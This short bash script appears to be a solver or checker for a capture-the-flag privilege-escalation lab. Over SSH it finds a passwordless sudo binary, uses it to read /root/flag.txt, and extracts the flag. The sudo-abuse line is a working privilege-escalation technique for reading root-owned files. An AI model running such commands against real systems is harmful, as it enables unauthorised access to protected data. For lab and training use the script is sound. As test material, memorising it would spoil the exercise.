#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
raw="$(ssh_run 'BIN=$(sudo -l 2>/dev/null | awk "/NOPASSWD/ {print \$NF; exit}"); sudo -n "$BIN" -C /root/flag.txt')"
out="$(awk -F'|' 'NF>=2 {printf "%s", $2}' <<<"${raw}" | grep -oE 'FLAG\{[^}]+\}' || true)"
assert_root_output "${out}"
